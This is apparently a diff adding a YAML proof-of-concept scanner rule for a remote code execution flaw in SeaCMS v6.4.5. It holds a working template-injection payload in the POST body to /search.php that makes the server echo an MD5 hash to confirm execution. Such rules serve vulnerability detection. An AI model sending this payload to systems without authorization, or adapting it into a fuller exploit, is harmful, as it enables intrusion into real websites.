@@ -1,0 +1,14 @@
+name: poc-yaml-seacms-v6.4.5-rce
+rules:
+  - method: POST
+    path: /search.php
+    body: 'searchtype=5&order=}{end if}{if:1)echo md5(1234);if(1}{end if}'
+    follow_redirects: false
+    expression: |
+      status==200 && body.bcontains(b'81dc9bdb52d04dc20036dbd8313ed055')
+detail:
+    author: leezp
+    Affected Version: "seacms v6.4.5"
+    test_env: "https://www.0933.me/share/3365630.html"
+    vuln_url: "/search.php"
+    link: "https://www.cnblogs.com/wfzWebSecuity/p/11101008.html"
